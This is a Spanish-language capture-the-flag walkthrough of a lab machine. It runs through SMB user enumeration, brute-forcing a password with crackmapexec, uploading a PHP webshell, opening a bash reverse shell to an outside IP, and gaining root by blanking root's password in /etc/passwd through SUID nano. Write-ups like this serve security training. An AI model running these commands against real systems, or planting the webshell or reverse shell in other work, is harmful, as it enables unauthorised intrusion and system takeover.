-MUY CHULA

PORT    STATE SERVICE
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

-Entramos a la web y nos dan a entender que la intrusión va por SMB

-Enumeramos el servicio SMB y listamos su contenido:
	smbclient -N -L 172.17.0.2

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	html            Disk      HTML Share
	IPC$            IPC       IPC Service (6bdb5ea08bd3 server (Samba, Ubuntu))

-No tenemos permisos para acceder a ninguno

-Tenemos que enumerar usuarios, tenemos varias técnicas:
	1-Enum4Linux -a 172.17.0.2 
		-a: Realiza una serie de enumeraciones de manera automática. Entre ellas está la de enumerar usuarios del sistema.
		-Nos encuentra los siguientes usuarios:
			james (Local User)
			bob (Local User)
	2-Rpcclient 
		1-Nos conectamos a rpcclient y desde dentro enumeramos los usuarios:
			rpcclient -U '' -N 172.17.0.2
			rpcclient $> enumdomusers
			user:[james] rid:[0x3e8]
			user:[bob] rid:[0x3e9]
		2-Ejecutamos el comando directamente:
			rpcclient -U '' -N 172.17.0.2 -c 'enumdomusers'
			user:[james] rid:[0x3e8]
			user:[bob] rid:[0x3e9]

-Hacemos un ataque de fuerza bruta para encontrar la contraseña de algún usuario. Hydra da error en smb, así que utilizamos la herramienta 'Crackmapecxec':
	-crackmapexec smb 172.17.0.2 -u bob -p /usr/share/wordlists/rockyou.txt
	SMB         172.17.0.2      445    6BDB5EA08BD3     [+] 6BDB5EA08BD3\bob:star 

-Ahora que tenemos la contraseña del usuario bob, nos autenticamos por SMB y listamos el contenido:
	-Nos autenticamos: smbclient //172.17.0.2/html -U bob
		smb: \> ls
		index.html                          N     1832  Thu Apr 11 04:21:43 2024

-Parece ser que tenemos acceso al directorio html, que equivale a la ruta /var/www/html dentro del servidor, por lo que todos los archivos que subamos se podrán ver a través de la web.

-Subimos una webshell.php y nos mandamos una reverse shell desde la web:
	-Creamos la webshell: echo '<?php echo "<pre>" . shell_exec($_REQUEST["cmd"]) . "</pre>"; ?>' > webshell.php
	-Subimos la webshell a SMB: put webshell.php
	-Comprobamos que funcione la webshell:
		-http://172.17.0.2/webshell.php?cmd=id
		uid=33(www-data) gid=33(www-data) groups=33(www-data)
	-Nos mandamos la reverse shell:
		-http://172.17.0.2/webshell.php?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.1.135/1234 0>%261"
		www-data@6bdb5ea08bd3:/$


## Escalada de Privilegios

-Buscamos por binarios con permisos SUID:
	/usr/bin/nano

-Intento explotarlo con Gtfobins pero nada.

-Como podemos editar cualquier archivo con nano, abrimos el /etc/passwd y le quitamos la 'x' al usuario root. Esto significa que le hemos quitado la contraseña cifrada y nos podemos autenticar como root sin contraseña:
	-Como estaba root en el /etc/passwd: root:x:0:0:root:/root:/bin/bash
	-Como queda root en el /etc/passwd: root::0:0:root:/root:/bin/bash

-Pivotamos al usuario root sin necesidad de aportar contraseña:
	-su root
	root@6bdb5ea08bd3:/# whoami
	root






